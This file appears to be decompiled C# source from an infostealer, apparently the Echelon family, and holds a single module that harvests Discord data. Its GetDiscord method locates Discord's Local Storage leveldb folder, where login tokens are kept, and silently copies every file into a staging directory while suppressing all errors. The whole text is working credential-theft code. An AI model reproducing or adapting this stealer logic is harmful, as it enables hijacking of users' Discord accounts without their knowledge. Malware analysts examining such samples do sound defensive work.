using System;
using System.IO;

namespace Mist
{
	// Token: 0x0200004C RID: 76
	internal class Discord
	{
		// Token: 0x06000217 RID: 535 RVA: 0x0000FFA0 File Offset: 0x0000E1A0
		public static void GetDiscord(string Echelon_Dir)
		{
			try
			{
				if (Directory.Exists(Help.AppDate + Discord.dir))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + Discord.dir).GetFiles())
					{
						Directory.CreateDirectory(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\");
						fileInfo.CopyTo(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\" + fileInfo.Name);
					}
					Discord.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000116 RID: 278
		public static int count = 0;

		// Token: 0x04000117 RID: 279
		public static string dir = "\\discord\\Local Storage\\leveldb\\";
	}
}
